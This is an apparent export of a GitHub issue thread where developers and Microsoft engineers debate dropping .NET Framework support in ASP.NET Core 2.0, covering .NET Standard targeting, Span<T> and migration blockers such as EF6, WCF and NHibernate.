> ASP.NET Core 1.x runs on .NET Core 2.x and .NET Framework, supports .NET Standard 2.x (via .NET Core 2.x); and has the same apis as ASP.NET Core 2.x, So that's the stepping stone release.
> ASP.NET Core 2.x is the break release. It still supports .NET Standard 2.x (via .NET Core 2.x) and not much api-wise has changed between ASP.NET Core 1.x and ASP.NET Core 2.x; but drops .NET Framework.

Yes, and let's see what the options really are :) ASPNET Core 1.x is a dead end: you can port to that but your code can't move to .net core if you depend on libs which are .net full today and might not be ported to .net core /standard when support ends. Choosing ASP.NET core 1.x now is only wise if your dependencies are already on netstandard2.0/.netcore, then you can move to asp.net core 2.x without problems, knowing you are not running into a dead end. 

Your suggestion to choose system.web as an alternative to nginx and a JVM stack if you want to have stability is a bit weak, don't you think? :) It's about options for a large org what to pick as platform. Unless they're creating an app that's completely new and doesn't have to work with outside dependencies (rare) they'll likely take the safe bet, and why wouldn't they? If it then comes down to system.web or JVM/nginx the choice is pretty simple. 

It's the little things. I hammered on it before: sql server enterprises' encryption features. You're not going to use these on .net core as they're not there. Oracle? nope. So if you want to use asp.net core and these features, you have to use .net full and asp.net core 1.x. But what happens if these features aren't ported/available when support for asp.net core 1.x ends? (and who wants to bet the farm on a platform which is in 'QFE mode' already?) Back to system.web? "
689	"It seems to me that part of the issue is that ASP.NET is directly driving the evolution of .NET Core. I guess that's an internal thing in Microsoft, but really the platform and a specific library should not be so tightly coupled. 

If something new needs adding to a version of .NET then it should be made available to everyone via a netstandard bump (with vNext) and then ASP.NET updated to use it when it is released. It's the privileged position of ASP.NET that causes this issue I think. This may be unavoidable due to the groups of developers inside Microsoft being the same...

As a writer of HPC software that uses .NET heavily we've also implemented our own zero allocation parsing etc without changes to the underlying platform. Would we benefit from Span etc? Absolutely! Can we switch to .NET Core? Not for a long time. Will we see Span etc added to .NET Framework? Seems hard to say now without it being a netstandard commitment..."
690	@markrendle Sure, but what's our transition plan? I can't see one that doesn't hit unsupported paths. If the changes were in netstandard and then ASP.NET Core used them then at least we'd know there was a path through eventually.... 
691	"@markrendle i'm not sure who are the intended users of asp.net core. but what i saw are mostly .net users who have big investment in .net and big legacy (not bad) codebase. if we are not the intended users, i dont see node.js/python/go guys give .net a sh*t, no matter how good we think .net is. 
if it is not for company but for my own projects, i will not use asp but use nancy instead. companies need stable guarantee and support. and they/we pay big money for it. "
692	"The easy solution to this problem would be, if Microsoft would make a Windows only distribution of CoreCLR that supports the full range of .NET Framework libraries.

The personal side in me is cool playing with .NET Core on the PI on ubuntu but the business side didn't even consider .NET Core because .NET Framework does everything we need and .NET Core is only trouble in comparison. Most of this trouble was around tooling and getting everyone setup'd so those pains are finally going away, but it still lacks so many features... EF Core isn't even close to being mellow enough to substitute EF6 or NHibernate and they won't run on .NET Core 2 either. The lack of WCF (host) for SOAP Services is quite a burden, since its what we do all day in business communication, but could probably be migitated through clever design and using .NET Core and .NET Framework in multiple apps. AppDomains are also not easily replaced although thats the least of my problems. The leap from ASP.NET MVC 5 to MVC Core was unexpectedly easy for a rewrite but going .NET Core makes VS stop cooperating, displaying all the errors.

*Fun* things like hosting ASP.NET Core inside WPF will also be impossible.

It wouldn't even matter if the Windows CoreCLR distribution would be closed source since its not much different from .NET Framework today.

Now excuse me while i quietly weep and delete my experimental branches that were migrated to ASP.NET Core."
693	"> Your suggestion to choose system.web as an alternative to nginx and a JVM stack if you want to have stability is a bit weak, don't you think?

Its the extreme end ;)

> If it then comes down to system.web or JVM/nginx the choice is pretty simple.

Yeah, if you can go JVM, you use ASP.NET Core 2 as you don't have blockers and it has nice interop and p/invoking :)

> if the apis are ""pretty much the same"", why don't you keep one version numbering 2x for all, but having option to select for ""netstandard"" or""netcore""?

Because its the internals that are changing; and making use of changes to the runtime, jit and standard libraries. To a user they appear mostly the same as that's where the compatibility is between ASP.NET 1.x and 2.x; on the exposed api surface, not the internals ""here's how its done"".

> It seems to me that part of the issue is that ASP.NET is directly driving the evolution of .NET Core. 

As are other people. You can make an api request over at [dotnet/corefx](https://github.com/dotnet/corefx) as [I did for example for ValueTask](https://github.com/dotnet/corefx/issues/4708); which then evolved into Task-likes and is now part of C#7. 

As soon as your api is included in .NET Core you can the start using it (if you go for nightlies and want to make sure the api is right); or at the next release of coreclr/corefx if you want to hang on 6 months. 

> and then ASP.NET updated to use it when it is released. 

Now you have to wait 2 years. That's not really practical; as the apis will need refinement through use; and through use more discovery will happen. That's like adding a 2 year compile step to your development cycle.

> As a writer of HPC software that uses .NET heavily we've also implemented our own zero allocation parsing etc without changes to the underlying platform. Would we benefit from Span etc? Absolutely! Can we switch to .NET Core? Not for a long time. 

Is your HPC software directly hanging off web requests? At a guess it might have queues driven by webrequests, but it runs in a separate process so should be unaffected by this change?

> Will we see Span etc added to .NET Framework? 

Yes"
694	"@benaadams 
> But by the time it catches up, ASP.NET will have moved on to the next .NET Standard version and it would never be the right version of .NET Framework for ASP.NET; it would always be behind.

Which is completely fine and acceptable, if there is at least 1 version overlap (i.e. if you stay on the latest full framework there is still at least one officially supported (ASP).NET Core version around running on that)."
695	"> Microsoft would make a Windows only distribution of CoreCLR that supports the full range of .NET Framework libraries.

Or a set of .NET Standard 2.0 libraries; so they can run on .NET Core, that only run on Windows that cover the api gap?"
696	@benaadams yeah thats the idea, although that won't work for anything that throws PlatformNotSupportedException
697	"@qrli If it's modular, then you can upgrade the modules that can be upgraded now, and leave the rest until later.

Unless by ""modular"" you mean ""it's a massive monolithic System.Web ASP.NET IIS application comprising dozens of different libraries interoperating via PInvoke and COM"" in which case, that's a big ball of mud."
698	Is there a final list of which assemblies are affected and which are not? It has been mentioned that `Microsoft.Extensions.*` is safe and `Microsoft.AspNetCore.Razor.Runtime` (assumed) too, thanks to which `Microsoft.AspNetCore.Html.Abstractions` needs to stay on `netstandard` also. Is there anything else in the `Microsoft.AspNetCore.*` that is staying on `netstandard`?
699	@bencyoung My recommended transition plan is to migrate various components over time to standalone services targeting .NET Core 2.x (or whatever works best out of the entire universe of development tools for that particular component), consuming those services from your legacy code over a standard API boundary using HTTP or a message bus, until you've got a proper distributed system architecture.
700	@markrendle Not everything belongs in a distributed system though. As a concrete example: a large part of why Stack Overflow renders pages so fast is that it's *not* distributed. Though our network latency is 0.017ms, that would add quite a bit of network, serialization, deserialization, and GC cost to our application. Sharding a system out into many services it not a universal answer. It's a complicated one, a costly one, and a net negative for a many scenarios as well. It *may* be a good thing, but it can also be an over-complicated bad thing.
701	"@markrendle my issue isn't one of migrating to services, it's that some of the fundamental service infrastructure building blocks use APIs that aren't on the roadmap for `netstandard20` or even `netstandardbanana`. .NET Core for us isn't about greenfield applications, it's about entire greenfield systems. `System.DirectoryServices` is one example but for others, it's WCF, and more others, it's `System.Data` and the SqlClient stuff,  and for us, `System.Messaging`. 

I'm all for using .NET Core when I can. So far that has included zero client projects, greenfield or not, they're all blocked on *something*."
702	@NickCraver I don't mean to be facetious or anything, and I know that the real reason that SO pages render so fast is that you and the other people who build it are amazing, but the Google search results that include links to your pages render just as fast as your pages, and you _know_ they're coming from a big, complicated distributed system. Amazon pages render pretty fast, same deal. I'm optimistic that ASP.NET Core is driving towards a future where it can be used to build systems the same way those are built, with the same performance, and I think it's got a better chance of getting there if it frees itself from the turning-a-small-island update cycle of full .NET.
703	@jbogard I see similar, but that'll be very different when .NET Core 2.0 is out.
704	"@jbogard 

> netstandardbanana

quote of the thread"
705	"The main issue with this, for me and my team, is that there was no indication that this path was the intended future. I get no one knows the future but hearing that we need to break out anything that relies on full .net framework (component vendor dlls, payment services sdks, HSM sdks) into their own services and introduce that new hop STINGS. It just isn't something this site needed and now we have to either introduce more dev ops complexity or re-do the web app portion to MVC 5.

We went with asp.net core for the speed of kestrel and the fancy new API. It would have been nice to be able to more accurately weigh the options against the lack of an easy upgrade path given our dependencies."
706	"Adding to @jabrown85 
ASP.NET Core has been a rollercoaster of emotions thus far.
After csproj landed i finally went ""it's ready now"" and considered it a no brainer to start anything new in it and checking what can be upgraded. After this announcement, its more like: ""does .NET Core definitely support the scenario or should we go safe and just stay with MVC5?""

Casualties are low so far, only one application written in ASP.NET Core that manages the administrative tasks of the primary MVC 5 app, but it will be stuck on 1.x forever because the main app uses NHibernate."
707	"@markrendle computer says no

It'd be nice if there were some roadmap for full .NET -> netstandard. Some of the fundamental pieces just say ""Not Supported"" from ApiPort. I'll be running fuller analysis of the client projects on ASP.NET Core 1.x to see what's missing."
708	"> but it will be stuck on 1.x forever because the main app uses NHibernate.

Shouldn't be, NHibernate isn't dead is it?"
709	@benaadams surprisingly no. There are a few things that it does that EF6 really doesn't have any equivalent. We default to EF6 but there are cases where we have to go the NH route.
710	"@benaadams officially no, it has pauses where it seems almost dead but usually theres one commit every few days. ApiPort reports 72.26% coverage for .NET Standard but i'm not really convinced that it will be ported (in the near future at least).
"
711	"Reading the comments, I am concerned about the general direction this project is heading. For a long time ASP.NET was a good choice for a stable and solid technology. However, I don't get the same feeling now. There are many ""move fast and break things"" technologies, but that's a whole different category.
I hope that Microsoft will be able to address those concerns  and align everyone's expectations.

It's not about enterprise vs. non-enterprise software. There are plenty of Python 2.x applications in use today and not all of them are ""enterprise"". What's more - not all new projects use Python 3 (almost 9 years after the release of Python 3.0!)."
712	"Can anyone summarize the whole thread in a blog post?

I've read through all 300+ comments while on commute/lunch and ... I still seem to not ""get it"" completely.

What I get is:

* The full .NET Framework won't be supported on .NET Core 2
* Every dependency will depend on `netcoreapp2.0` instead of `netstandard2.0`
* If I want something like DirectoryServices or Drawing, I need to drop Full Framework and jump to 2.0

I kind of missed the rest... busy schedule and everything."
713	"@MaximRouiller

> If I want something like DirectoryServices or Drawing, I need to drop Full Framework and jump to 2.0

No, if you want to a library that does not support .net core, you will not be able to use AspNet Core 2.0+ at all."
714	@MaximRouiller, what they just did is that Asp.Net core projects won't be able to reference full framework assemblies, making it useless for many if not most, they say asemblies like system.drawing and Directoryservices will be ported to the new netstandar or I dunno, still, old assemblies won't work unleast someone port them, so, it is pretty much useless for many becuase some assemblies are legacy and won't be ported, ever. In conclusion, anyone who was using .net core with the full version of the .NET framework just got screwed and need to go back to MVC 5.
715	"@davidfowl Thanks for [this list](https://github.com/aspnet/Home/issues/2022#issuecomment-300141134) by the way. That's the very important ""so what are we getting out of this?"" piece needed for people to balance the cost/benefit in their minds.

If you haven't already, [read the list](https://github.com/aspnet/Home/issues/2022#issuecomment-300141134) so you're informed on both sides. I still stand by wanting 2.x to be a transition release (with justifiable benefits to the business to actually warrant the move), and 3.x being where the wins are. Even if it came out 2 days later. I really do appreciate the insight on all sides."
716	"@davidfowl you said:
> Libraries can be written on top of the standard. When things in the standard itself need to change it will take a lot longer to be adopted in all implementations of .NET and that includes .NET Framework. It can mean a couple of things:
.NET Standard will evolve at the rate of the slowest implementation
.NET Standard will evolve at some other pace and .NET Framework will be the last to catch up.

But why is that the case? Can't you release .NET Standard vNext and have .NET catch up to it some time later (a few months to a year later)? That means that people who are on the bleeding edge and want the latest ASP.NET Core can host in .NET Core, and people who need .NET for their legacy code can eventually use that version of ASP.NET Core once .NET catches up to the .NET Standard version that it uses. I don't understand why .NET Standard has to be revved as fast as the lowest implementation.
Also here we are talking about *official* implementations of the standard, but there will be other implementations that will not be updated in tandem with the standard.
That way you don't leave people behind. Sure, they take a little longer to benefit from the latest features if they are in .NET, but they aren't stuck forever."
717	"@jdom because I know the rate at which .NET Framework changes and why it has to be slow. It's a different distribution and maybe there isn't enough appreciation for that. Any change gets inplace pushed to billions of machines. The layering is also completely different so it's not a trivial thing to even reason about.

> I don't understand why .NET Standard has to be revved as fast as the lowest implementation.

If we keep raising the low watermark for .net standard in ASP.NET Core it defeats the purpose and leaves you in the same situation. Sure you don't feel left behind because there's a promise that someday these APIs are coming to .NET Framework but in what timeline? .NET 4.7 still doesn't complete feature parity with .NET Standard 2.0.
"
718	@davidfowl but this will bring back the same problem as with PCLs, it will become the lowest common denominator and a pain to use, the fact that ASP.NET abandons using it shows that already.
719	"> @davidfowl but this will bring back the same problem as with PCLs, it will become the lowest common denominator and a pain to use,

@Suchiman how is that an issue? The only problem with PCLs was how they were dynamically calculated and represented in NuGet which made it hard to predict what you were going to get. How else would netstandard work if it wasn't an API set that could be implemented by different implementations? 

What made PCLs annoying to use were the super duper small API surface area. .NET Standard 1.3-1.4 is enough to implement most basic libraries API wise. 

.NET Standard was always about breadth. 

ASP.NET Core and .NET Core were about a *competitive* cross platform server stack for building light weight micro-services. The breath in this sense was broader platform support (running on linux, osx, tizen, pi etc). "
720	"@davidfowl 

> We've identified strings as one of the major things we'd like to try tackling in .NET Core, there's tons of ideas but one of them is to have string be utf8 by default (tons of compat problems but follow me here).

> Another thing we'd like to fix is the ability to take cheap slices of arrays/strings, any piece of contiguous memory. We've added Span<T> and are looking at Buffer<T> to represent this. It might mean that String and Array implement new interfaces that make it possible to take a slice that requires 0 allocation.

It sounds like this means that if I want to use these new bits in a library, the library will also need to target `netcoreapp2.0` instead of `netstandard2.0`. Is that correct?"
721	"It's a really bad idea not to support the old 4.x framework any more. People don't upgrade if it causes a lot of work. See the super old classic ASP, which is deprecated since 2002 - about 15 years. And we have old applications that still exist in classic ASP! Does Microsoft like to see something similar once again? Dropping old 4.x support is something that has to be done mandatory - but on the long run! Not now. This can be an option in a few years, when .NET core is the de facto standard and only old applications use the net 4.x. 

The idea behind (ASP).NET Core is really great, the best thing Microsoft did since the realease of .NET. But such a chaos dulls this nice concept. Also it's very sad, that Microsoft decide such massive changes on their own, without even discussing it in the community! Seems like this company hasn't completely learned yet how to handle open source projects. "
722	"@davidfowl 
> .NET Standard was always about breadth.

Breadth in APIs or platforms?

Whats the issue with evolving `.netstandard` at the same pace as `.netcoreapp`?
Is any of the BCL tunings target specific to `.netcoreapp` because they'll never be implemented in the other frameworks?

Releasing `.netstandard2.1` at the same time as `.netcoreapp2.1` doesn't make a difference to releasing  `.netcoreapp2.1` first and a year later  `.netstandard2.1` at the same time as `.net50`, except that packages targeting `.netstandard2.1` would start immediately functioning on `.net50` but will be blocked if they target `.netcoreapp2.1`"
723	"ASP.NET Core is a high level webapp framework built on top of .NET Core and will in the future target .NET Core, _however_ it can also be a high level webapp framework built on top of .NET Standard instead, so that it targets a reference API interface rather than a specific implementation of it.

The public positioning of .NET Standard is being an easy target to build towards while leaving the implementation details aside - with 2 official frameworks directly from Microsoft to cover most use-cases.

**Why change that story now?** If the .NET Framework never catches up, that seems to be beside the point. At least the possibility is there that it will, or another 3rd party framework can do so. So what if there will only be a single implementation that realistically keeps pace? This is exactly why we have interfaces in our applications even if there's just a single concrete implementation, so that we have the flexibility and advantages it brings.

Perhaps bring down the scope on ASP.NET Core 2.0 inline with .NET Standard 2.0 and then use .NET Standard 2.1 for newer features? Add in some decent support timelines and wouldn't that solve this entire dilemma? Microsoft owns the .NET Standard and both frameworks so this fear in incrementing versions seems completely unfounded..."
724	"I guess it should be considered that ASP.NET to ASP.NET Core isn't the migration path for everyone. 

ASP.NET on full framework will remain and get features but not like Core.

Migration will get easier over time but never be a 100% match.

People still run classic ASP.  That's fine for them too."
725	"@davidfowl I have huge respect for the whole team and the advancements you're all making. So, please don't take this as being down on what is happening. You guys are pioneers, and we all look to you as examples on how to do things right. But I don't see many of these points as immediate target changing problems, especially when it hasn't been communicated. Maybe I'm wrong.

> I want to throw some crazy stuff out here because it's been mentioned a few times. What I'm about to say has no bearing on what will happen, it's all speculation at this point. Several people asked why we want to target .NET Core instead of .NET Standard.
> * We've identified strings as one of the major things we'd like to try tackling in .NET Core, there's tons of ideas but one of them is to have string be utf8 by default (tons of compat problems but follow me here).

This point here would definitely be a game changer, but IMO it's the only one that absolutely requires not targeting framework, and it isn't for netcoreapp20 anyway.

> * Another thing we'd like to fix is the ability to take cheap slices of arrays/strings, any piece of contiguous memory. We've added Span<T> and are looking at Buffer<T> to represent this. It might mean that String and Array implement new interfaces that make it possible to take a slice that requires 0 allocation.
> * This leads to new methods on String that allow splitting that doesn't allocate an array every time.
> * This leads to overloads to Int, UInt etc (TryParse) that take Span<char> and Span<byte>.
> * This leads to new encoding routines that take Span<byte>.
> * Buffer<T> and Span<T> let you represent memory in a uniform way and we want to upgrade the networking stack to allow passing pre-pinned buffers that take Span<T> or Buffer<T>.

All of this is still implementable as packages on top of current netstandard. You don't even need netstandard20 for this. I understand not wanting to carry this baggage around, but the rest of us out in the non-MS world have to create custom BCL-esque impl's all the time when the use case or perf doesn't fit. Not to mention that the Span API isn't targeted for 2.0 either (unless that's changed again).

>Kestrel will implement HTTP2 in the 2.x timeframe (currently aiming at 2.1) and that requires new APIs on SSL stream to do ALPN (https://en.wikipedia.org/wiki/Application-Layer_Protocol_Negotiation).
Http Client on .NET Core supports duplex streaming, it'll make it possible to implement streaming end points over http in signalr over a single, non websocket http request.

I feel like this one is a little trickier, but not all that different from Kestrel carrying around libuv. The CURL implementation from .Net Core can be easily pulled into a netstandard extension package until everyone catches up.

> * We forked the header parser implementations from HttpClient and System.Net.Http and renamed them (https://github.com/aspnet/HttpAbstractions/tree/d1d9bceff56cb44a194ae36923ce687e5e353006/src/Microsoft.Net.Http.Headers) so that we could improve them and have them support both .NET Framework and .NET Core. .NET Core has a copy of these improvements haven't made it back because there no need to improve them (we couldn't consume them).

Right, but this is arguably the right way of doing this in this case. Frustrating to wait and hang on to the implementations, but again, I don't see how this is different than what anyone else does when they write a framework or library.

> * Without the ability to rev the core primitives, we're encouraged to fork them and make things that look like them but aren't them. It's the reason we have our own little BCL within ASP.NET Core https://github.com/aspnet/Common/tree/dev/src/Microsoft.Extensions.Primitives.

Again, just like the rest of us.

> ASP.NET Core and .NET Core were about a competitive cross platform server stack for building light weight micro services.

ASP.Net Core had some messaging like that. .Net Core has been messaged from day one as a wholly functional xplat server-side .Net framework subset. Never have I heard anyone say that .Net Core is just for microservices. I've heard you can use it with ASP.Net Core if you want, but also console apps, data analysis, DB services, etc. Is the direction of .Net Core effectively ""whatever the ASP.Net Core team wants most""?

> ASP.NET on full framework will remain and get features but not like Core.

Will it? I still haven't seen anyone from MS confirm that it is still being worked on. My gut says that it isn't. I get it. The team needs a ""move it or lose it"" type of moment to break free. I just don't think this is that moment yet."
726	Assuming that we have a business logic 4.6 assembly, which uses the Oracle.Net driver, the NHibernate and the RabbitMQ (all of them in 4.6). The interface with ASP.Net  is only through our business objects, requests and responses. Can we reference this assembly in our ASP.Net Core 2 , without recompile ?
727	"My quick summary
![aspnetcore](https://cloud.githubusercontent.com/assets/2368976/25867421/c92bcd30-34f9-11e7-8041-ea1550cf8361.png)
"
728	@stefan2410 short answer, no, you cannot reference the full framewrok, you could reference those assemblies only if they are created for the netstandar 2.0.
729	"@mattnischan

> All of this is still implementable as packages on top of current netstandard. You don't even need netstandard20 for this. I understand not wanting to carry this baggage around, but the rest of us out in the non-MS world have to create custom BCL-esque impl's all the time when the use case or perf doesn't fit. 

I'm sorry but it really isn't. You can't monkey patch types. Unless you are suggesting we add new types and don't change the existing ones.

> Not to mention that the Span API isn't targeted for 2.0 either (unless that's changed again).

Span exists in 2.0 as implementation but not a public API. We make breaking changes in new majors so we can do more features in minor versions. If ASP.NET Core 2.1 targeted .NET Standard 2.1 then .NET Framework support is dropped again.

> I feel like this one is a little trickier, but not all that different from Kestrel carrying around libuv. The CURL implementation from .Net Core can be easily pulled into a netstandard extension package until everyone catches up.

So what you're saying is we should rename all of the classes in the BCL so we can use them on both .NET Standard.

> Never have I heard anyone say that .Net Core is just for microservices. I've heard you can use it with ASP.Net Core if you want, but also console apps, data analysis, DB services, etc. Is the direction of .Net Core effectively ""whatever the ASP.Net Core team wants most""?

Nope, .NET Core is a general purpose framework that originally had no verticals at its core. It's possible ASP.NET Core should have just been a vertical instead of libraries on top of .NET Core, it would have possibly avoided some of this confusion.

> Will it? I still haven't seen anyone from MS confirm that it is still being worked on. My gut says that it isn't. I get it. The team needs a ""move it or lose it"" type of moment to break free. I just don't think this is that moment yet.

Yes, HTTP/2 support was added in the last release. There's another team that *does* work on ASP.NET and IIS and they do make improvements. However, they are not on the same scale as what ASP.NET Core is doing."
730	"I don't have very strong feelings about this as I've avoided running my ASP.NET Core services on full framework like the plague. With that being said, I've had to avoid using some nice and mature libraries because they didn't support .NET Standard because they were either waiting for `netstandard2.0` or simply because they didn't want to.

My fear is that removing the ability to run ASP.NET Core on full framework will dissuade users from porting their current MVC 5/Web API 2 apps to ASP.NET Core which will just provide another reason for library authors to avoid porting to .NET Standard. Why bother doing the work upgrading if none of your users will benefit? It becomes a chicken and egg problem and I'm just afraid that this will hurt the ecosystem as a whole just as it started to get some traction. First you need ASP.NET Core users and I'm not convinced there's as many of those as we all would like. Hopefully I'm wrong."
731	"> If ASP.NET Core 2.1 targeted .NET Standard 2.1 then .NET Framework support is dropped again.

No, it just means that Net Framework will automatically support ASP.NET Core 2.1 as soon as it supports .NET Standard 2.1, whenever that is, even if it takes a year or two.

The same for all other .NET Standard compliant platforms (Xamarin / Unity / ...).

Building on .NET Standard means that other platforms will light up _eventually_, building on .NET Core means they will light up __never__.

I assume that the plan is still that full-fx will catch up to netstandard, even if with a long delay?
(and if no other platform except NET Core is expected to implement .NET Standard 2.1, then why even have a .NET Standard?)"
732	"> I'm sorry but it really isn't. You can't monkey patch types. Unless you are suggesting we add new types and don't change the existing ones.

The latter is what has already been done in most cases in 1.x, right? Is that suddenly no longer tenable?

> Span exists in 2.0 as implementation but not a public API. We make breaking changes in new majors so we can do more features in minor versions. If ASP.NET Core 2.1 targeted .NET Standard 2.1 then .NET Framework support is dropped again.

Why would it be dropped? Are you saying Span will _never_ exist on Framework?

>So what you're saying is we should rename all of the classes in the BCL so we can use them on both .NET Standard.

Woah, no. I'm saying that if I need a Dictionary with a different API, I have to create something else and also not call it System.Collections.Generic.Dictionary, same as you guys already did with Microsoft.Net.*

> Yes, HTTP/2 support was added in the last release. There's another team that does work on ASP.NET and IIS and they do make improvements. However, they are not on the same scale as what ASP.NET Core is doing.

That's fair. I was not aware of that."
733	"> The latter is what has already been done in most cases in 1.x, right? Is that suddenly no longer tenable?

It creates a mess. They've tried to do that as little as possible. The API design and deployment is so more drastically complicated than most people realize, I think. And it's not the Microsoft guys making it that way, it's the reality of supporting many platforms and timelines. I didn't appreciate this until being in the middle of it several times and talking everything through. I really wish type forwarding was at the method level, though. It'd have solve quite a few cases so far :(

> Why would it be dropped? Are you saying Span will never exist on Framework?

It would need to be dropped *from ASP.NET Core 2.0*, as the timelines wouldn't align anymore, since full framework wouldn't have it *yet*."
734	"> It would need to be dropped from ASP.NET Core 2.0, as the timelines wouldn't align anymore, since full framework wouldn't have it yet.

AFAIK, Spans are part of a `netstandard1.x` package that can be used on .NET Desktop (it's a portable implementation so it doesn't have the same perf' boost as if it was backed into the CLR, but it's likely good enough).

Edit: the `System.Memory` package has a `netstandard1.0` TFM, so it can be used even on .NET 4.5.

![image](https://cloud.githubusercontent.com/assets/6998306/25868934/c46b6c2e-34fe-11e7-9a26-38c846030707.png)
"
735	"> The latter is what has already been done in most cases in 1.x, right? Is that suddenly no longer tenable?

We halt feature work in certain directions today because of it. It's intentional and we hold ourselves back and refuse to use new APIs by copying and re-implementing things outside of .NET Standard so that .NET Framework can work. This isn't all things but there are some fundamental pieces that we would like to touch going forward, after all, we (Microsoft) control both sides.

> Why would it be dropped? Are you saying Span will never exist on Framework?

Span itself has a portable version that runs anywhere, I'm not sure the fast implementation will ever be on .NET Framework. The APIs that will be added to .NET Framework that take advantage of Span may take a *lot* longer than Span itself, it's extensive. When's the last time we changed string and array in .NET Framework? 

> Woah, no. I'm saying that if I need a Dictionary with a different API, I have to create something else and also not call it System.Collections.Generic.Dictionary, same as you guys already did with Microsoft.Net.*

That's exactly what you are suggesting. We don't want to have a Microsoft.Extensions.Collections.Generic. We try out best to avoid that and we live with the old APIs and polyfill where possible (https://github.com/aspnet/DependencyInjection/blob/139d91e57dd31fcd5c6ddaf11ad1f771b5855807/src/Microsoft.Extensions.DependencyInjection/Internal/ConcurrentDictionaryExtensions.cs). This isn't sustainable and it means .NET Core doesn't get the benefits because we actively avoid using it.
"
736	@PinpointTownes having spans isn't good enough, they need to use them in methods calls to existing types. That's when the class-level type forwarding comes into play and causes many problems.
737	"@0x53A

That's fair. Can you tell me why popular libraries on NuGet don't drop support for older .NET Framework versions that are clearly out of support? The most popular libraries target net20, net35, net40 etc. Why would it suddenly be ok to require the highest version of .NET Framework to keep using ASP.NET Core? Do you think that would be reasonable?"
738	This is a show-stopper. I have to consider cancelling migrations from ASP.NET MVC 5/Web Api 2 To Core. Many stable frameworks are not yet available for core. We are still using EF6.x because EF Core is not mature enough  [Feature Comparison](https://docs.microsoft.com/en-us/ef/efcore-and-ef6/features). 
739	"> @PinpointTownes having spans isn't good enough, they need to use them in methods calls to existing types.

""need"" is probably a bit excessive. Spans are mainly used for performance, so nothing prevents them from using the existing not-super-perfy overloads on .NET Desktop using ifdefs until .NET Desktop gets native support for Spans."
740	"@davidfowl I think the big issue is emotional. If you target netstandard, I know that I will be able to upgrade from 1.x to 2.x eventually (even if with a delay). Most of the time, updating netfx is not that big a deal for an application (different for a lib).

But some apps will never be able to make the jump netfx -> netcore, so if you target netcore, they know they are in a dead end with 1.x.

In that regard, it would have been better if Asp.net core had never run on netfx, as it stands, they expected that to continue, and now feel (rightfully, IMO) betrayed. After all, they may have already invested a lot of time into this.

I'm not personally invested in this, because I'm not a asp.net user, my big question is actually just

> I assume that the plan is still that full-fx will catch up to netstandard, even if with a long delay?
> (and if no other platform except NET Core is expected to implement .NET Standard 2.1, then why even have a .NET Standard?)

------------

Regarding other libs targeting net20, net35, etc, in my experience most authors try to target the lowest version they can and only cut platforms where they have no other choice.

And __yes, I think it is reasonable to drop support for older versions of .NET Framework__, because there is still a clear migration path available. Just update your version. Most of the time you don't even need to change anything, ""just"" recompile and test.

-------

I think you guys seriously underestimate the number of apps that will never be able to target netcore - just a single closed-source third-party dependency is enough to block that."
741	"> Span itself has a portable version that runs anywhere, I'm not sure the fast implementation will ever be on .NET Framework. The APIs that will be added to .NET Framework that take advantage of Span may take a lot longer than Span itself, it's extensive. When's the last time we changed string and array in .NET Framework?

@davidfowl I think this is maybe part of the problem. I've honestly been playing devil's advocate a bit here, because we're stuck in the middle as a greenfield app that started just before .Net Core was a thing, so we're straddling the line.

Our thinking has always been, use the fancy new libs (such as Kestrel) if at all possible, but wait for .Net Core to stabilize (and I'm glad we did, if only for the tooling changes), **_or_** wait for the cool Core bits to make it back to Framework. I think most people's assumption has been that most, if not all, of the advancements corefx has been making would make it into Framework vNext or vNext+1. But, it looks like (from our 30k foot view) from this and other changes that Framework is not a platform of the future.

I suppose if that's how it is, that's how it is. Our project is massive, so trust me when I say that I do understand the pain of having a bunch of custom impl's of things that are close to but not quite BCL types or ifdef spaghetti. So, I'm not suggesting things out of ignorance of the complications. There are definitely tradeoffs."
742	"Indeed a good question: what's left of the backporting of .net core features to .NET full? As I read here, .NET full is so brittle, moving code to it takes ages (it moves very slowly) and can break at any moment (could be, no idea how intertwined it is) so I then conclude that won't happen very often. 

It can't be both: either backporting to .NET full is OK, they just release less often (e.g. every 6 months to a year) or it's very complicated and error prone. If it's the former, just pick up the pace and don't let your users pay the bill and stop using the latter as an excuse. If it's the latter, isn't the right conclusion then that netstandard is a fallacy, as all that matters *for the future* is .netcore's API anyway?

I'm seriously concerned of the future of .NET's direction. My company builds tooling for .NET full and .NET standard1.6. The last thing we want is that the driving force of the direction of .NET (the new features which are about to be backported to .NET full, as said in the .NET core announcement all those moons ago) splits things and the ecosystem effectively gets split in half, as fragmentation is killing. 

*Nothing* in this thread has reassured me things are OK for the future of _all_ .NET and the ecosystem that's needed to make it stay alive: I only see two groups:

* People who are concerned that options are getting complicated and they have a tough problem ahead
* Microsoft who sees one road ahead: the .net core road. 

These two don't match at the moment. Can someone from Microsoft please get a coherent story out so we *all* can see what is the real deal, how things really are, i.e. with the backporting of features to .net full, what is done about the missing myriad of stuff in .net core (sqlserver stuff, transaction scope to name a few) and how Microsoft thinks they can sell this new direction as a **solid, reliable, dependable** platform for the future, so corporations and large teams can choose it without worry. "
743	"While I agree that all of this is a good thing in the long run, I also think that dropping support for the full framework with 2.0 is too early. 

We'd like to move to .NET Core as soon as possible, but unfortunately, our biggest blockers right now are almost exclusively *Microsoft libraries* (E.g. Entity Framework Core is not good enough yet, Azure Service Bus only has a very early preview).

While I hope that the Azure libraries will be ready in the next weeks/months, it doesn't seem like EF Core will have enough features anytime soon. 

I don't know anything about the internals of EF6 but wouldn't it be possible with reasonable effort to have it target netstandard? This would remove a huge blocker...

""Just staying on 1.x"" doesn't seem like a good alternative because there'll surely be lots of libraries that don't care (or don't have the resources/knowledge to support both) and just upgrade their dependency to 2.0 

PS: I'm very frustrated with how complex the .NET ecosystem has become over the last few years. I've had to spend A LOT of time to understand all of the new stuff and I don't see how a new developer should understand any of this. There's sooo much outdated information on the internet now due to all of these quite extreme breaking changes. 
Also, all the different product versions (.net core, sdk, .net standard, ...) are extremely confusing. I've yet to see someone who understands the .NET standard table without needing a 20 minute explanation. 😞 "
744	"> anyone who was using .net core with the full version of the .NET framework just got screwed and need to go back to MVC 5

Yep. I understand the reasoning, and I suppose I could say I should have seen this coming, but it's very frustrating to have this dropped on us with no prior warning.

We have an application ecosytem, like many others, with shared libraries dating back a decade and more, multiple MVC 3, 4, 5 apps, console apps, windows services, hundreds of thousands of lines of code. We're not even in that bad of a situation to upgrade compared to some.

